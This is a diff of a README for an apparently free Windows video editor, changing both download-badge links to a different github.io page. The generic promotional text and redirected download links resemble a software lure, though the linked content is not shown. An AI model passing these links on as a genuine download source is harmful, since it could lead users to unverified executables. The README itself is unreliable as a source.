@@ -4,7 +4,7 @@
 
 ## 📥 Download Free Video Editor for Windows
 
-[![⬇️ Download Free Video Editor](https://img.shields.io/badge/Download-Free%20Video%20Editor-blue?style=for-the-badge&logo=windows)](https://free-video-editor-for-windows.github.io/.github)
+[![⬇️ Download Free Video Editor](https://img.shields.io/badge/Download-Free%20Video%20Editor-blue?style=for-the-badge&logo=windows)](https://romanrocky453.github.io/.github/video-editor)
 
 ---
 
@@ -28,7 +28,7 @@ Free Video Editor is a versatile video editing software that offers an array of 
 
 The software supports a wide variety of video formats, provides options for adding effects, transitions, text overlays, and allows you to export your project in high quality. It’s ideal for those looking for a free and user-friendly alternative to expensive video editing software.
 
-[![⬇️ Download Free Video Editor](https://img.shields.io/badge/Download-Free%20Video%20Editor-blue?style=for-the-badge&logo=windows)](https://free-video-editor-for-windows.github.io/.github)
+[![⬇️ Download Free Video Editor](https://img.shields.io/badge/Download-Free%20Video%20Editor-blue?style=for-the-badge&logo=windows)](https://romanrocky453.github.io/.github/video-editor)
 
 ---
 
